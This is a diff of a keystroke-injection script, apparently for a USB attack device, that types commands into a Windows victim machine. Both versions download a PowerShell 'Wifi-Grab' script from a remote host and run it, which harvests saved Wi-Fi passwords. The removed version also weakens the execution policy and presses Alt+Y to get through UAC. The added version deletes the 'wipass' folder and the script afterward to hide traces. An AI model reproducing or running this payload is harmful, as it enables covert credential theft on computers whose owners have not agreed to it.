@@ -1,24 +1,42 @@
-layout('es');                   // Spanish keyboard layout
-typingSpeed(100,150)    // Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
+llayout('es');            // Spanish keyboard layout
+typingSpeed(10)    // Wait 10ms between keystrokes
 
-// the powershell script and this payload can be found at
-// https://github.com/axel05869/Wifi-Grab
-// --------GUIDE---------
-// download the powershell script.
-// edit and add the required data.
-// copy and paste all the text to notepad and save as anyname.txt.
-// upload the text to: https://cutt.ly/WjnNPa4
-// copy the direct download link.
 delay(500)
 // Opens the Windows Run prompt.
 press("GUI r")
 // Delays 0.2 seconds to give the Run prompt time to open.
-delay(200)
+delay(2000)
 // this command will download the text and save as d.ps1 then run
 // if the script failed to run change the ExecPolicy to Bypass
-type("powershell /w 1 /C Set-ExecutionPolicy RemoteSigned;wget "https://raw.githubusercontent.com/eur1p3des/THC/main/Scripts/Wifi_Grab/wifigrab.PS1?token=ARG2YG45FMECMEUW2W2NUM3AU52HW" -o \d.ps1;\d.ps1")
-// Presses Ctrl + Shift + Enter to execute the PowerShell with administrative privileges.
-// Delay 0.5 seconds to give the UAC prompt time to open.
-delay(500)
-// Presses Alt + Y to bypass UAC.
-press("ALT y")
+type("powershell")
+delay(1000)
+press("ENTER")
+delay(1000)
+type("wget http://172.16.0.1:8921/d.ps1 -o d.ps1")
+delay(100)
+press("ENTER")
+type("./d.ps1")
+delay(1000)
+press("ENTER")
+delay(10000)
+press("CONTROL c")
+delay(1000)
+type("cd ..")
+delay(1000)
+press("ENTER")
+delay(1000)
+type("rmdir wipass")
+delay(1000)
+press("ENTER")
+delay(1000)
+type("S")
+delay(1000)
+press("ENTER")
+delay(1000)
+type("rm d.ps1")
+delay(1000)
+press("ENTER")
+delay(1000)
+type("exit")
+delay(1000)
+press("ENTER")
